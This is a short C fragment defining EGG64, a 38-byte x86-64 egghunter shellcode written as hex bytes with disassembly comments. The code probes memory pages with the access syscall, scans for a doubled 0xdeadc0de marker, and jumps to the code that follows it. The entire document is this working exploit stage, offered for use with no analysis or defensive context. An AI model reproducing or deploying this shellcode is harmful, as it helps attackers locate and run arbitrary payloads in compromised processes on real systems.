
#define EGG64_SIZE 38

char EGG64[] = {
  /* 0000 */ "\x31\xff"             /* xor edi, edi        */
  /* 0002 */ "\xf7\xe7"             /* mul edi             */
  /* 0004 */ "\x96"                 /* xchg esi, eax       */
  /* 0005 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0007 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000A */ "\x57"                 /* push rdi            */
  /* 000B */ "\x48\x83\xc7\x08"     /* add rdi, 0x8        */
  /* 000F */ "\x6a\x15"             /* push 0x15           */
  /* 0011 */ "\x58"                 /* pop rax             */
  /* 0012 */ "\x0f\x05"             /* syscall             */
  /* 0014 */ "\x5f"                 /* pop rdi             */
  /* 0015 */ "\x3c\xf2"             /* cmp al, 0xf2        */
  /* 0017 */ "\x74\xee"             /* jz 0x7              */
  /* 0019 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 001E */ "\xaf"                 /* scasd               */
  /* 001F */ "\x75\xe9"             /* jnz 0xa             */
  /* 0021 */ "\xaf"                 /* scasd               */
  /* 0022 */ "\x75\xe6"             /* jnz 0xa             */
  /* 0024 */ "\xff\xe7"             /* jmp rdi             */
};